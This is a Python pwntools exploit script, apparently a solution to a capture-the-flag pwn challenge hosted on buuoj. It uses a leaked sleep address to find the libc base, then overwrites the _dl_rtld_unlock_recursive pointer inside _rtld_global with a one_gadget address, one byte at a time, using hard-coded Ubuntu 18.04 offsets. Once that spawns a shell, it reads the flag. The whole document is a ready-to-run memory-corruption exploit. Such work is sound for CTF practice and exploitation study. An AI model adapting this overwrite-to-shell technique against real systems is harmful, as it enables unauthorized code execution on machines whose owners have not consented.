# -*- coding: utf-8 -*-
from pwn import *

g_fname = args.FNAME 
g_elf = ELF(g_fname)
context.binary = g_elf
g_libcname = args.LIB if (args.LIB) else "/lib/x86_64-linux-gnu/libc.so.6"

if (args.LOCAL):
	g_io = process(g_fname)
else:
    rhost, rport = args.REMOTE.split(":")
    g_io = remote(rhost, int(rport))

g_libc = ELF(g_libcname)

def getpid():
	if (args.LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def pwn():
    ru("here is a gift ")
    addr_sleep = int(ru(',', drop=True), 16)
    libc_base = addr_sleep - g_libc.sym["sleep"]
    one_gadget = libc_base + 0x4f322 # buuoj's libc-2.27.so
    #one_gadget = libc_base + 0x4f432 
    log.debug("addr_sleep=%#x\n\tlibc@%#x\n\tone_gadget@%#x"
        , addr_sleep
        , libc_base
        , one_gadget
    )
    ru("good luck ;)")

    g_libc.address = libc_base
    #addr_rtld_global = libc_base + 0x61b060
    addr_rtld_global = libc_base + 0x619060 # _rtld_global's offset in ubuntu18.04.1
    # target is _rtld_global._rtld_dl_unlock_recursive
    addr_target = addr_rtld_global + 0xf08
    
    log.debug("_rtld_global@%#x\n\t_dl_rtld_unlock_recursive@%#x"
        , addr_rtld_global
        , addr_target
    )
    getpid()

    for i in range(5):
        s(p64(addr_target+i))
        s(p64(one_gadget)[i:i+1])

    sl("cat flag>&0")

if ("__main__" == __name__):
	if (args.DEBUG):
		context.log_level = "debug"
	pwn()
	g_io.interactive()
